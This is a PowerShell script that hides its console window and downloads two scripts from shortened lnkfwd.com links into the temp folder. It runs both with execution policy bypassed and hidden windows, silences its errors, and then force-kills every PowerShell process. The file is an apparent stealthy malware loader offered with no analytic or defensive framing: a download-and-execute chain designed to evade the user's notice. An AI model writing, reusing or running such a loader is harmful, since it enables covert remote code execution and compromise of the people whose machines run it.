#Start mo
Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class ConsoleWindow {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;

        public static void Hide() {
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, SW_HIDE);
        }

        public static void Show() {
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, SW_SHOW);
        }
    }
"@


# Hide the console window
[ConsoleWindow]::Hide()

# Define the URLs of the files to download
$url1 = "https://lnkfwd.com/u/KtRiC0kh"
$url2 = "https://lnkfwd.com/u/Kqc2ajEr"

# Define the destination paths in the %TEMP% directory
$destination1 = "$env:TEMP\ftf.ps1"
$destination2 = "$env:TEMP\Ain1.ps1"

# Use Invoke-WebRequest to download the first file with error handling
try {
    [ConsoleWindow]::Hide()
    Invoke-WebRequest -Uri $url1 -OutFile $destination1 -ErrorAction Stop
    # Output the path to confirm where the first file was saved
    #Write-Output "First file downloaded to: $destination1"
} catch {
    #Write-Output "Error: Unable to download file from $url1"
}

# Use Invoke-WebRequest to download the second file with error handling
try {
    [ConsoleWindow]::Hide()
    Invoke-WebRequest -Uri $url2 -OutFile $destination2 -ErrorAction Stop
    # Output the path to confirm where the second file was saved
    #Write-Output "Second file downloaded to: $destination2"
} catch {
    #Write-Output "Error: Unable to download file from $url2"
}


######## launch the first

# Run the first script (ftf.ps1) from the %TEMP% directory
[ConsoleWindow]::Hide()
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\ftf.ps1`"" -Wait

[ConsoleWindow]::Hide()
# Run the second script (Ain1.ps1) from the %TEMP% directory after the first finishes
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\Ain1.ps1`""

# Optionally, you can include a delay to ensure the scripts have time to start
Start-Sleep -Seconds 1

# Close all PowerShell instances
Get-Process powershell | Stop-Process -Force

# Exit the script
exit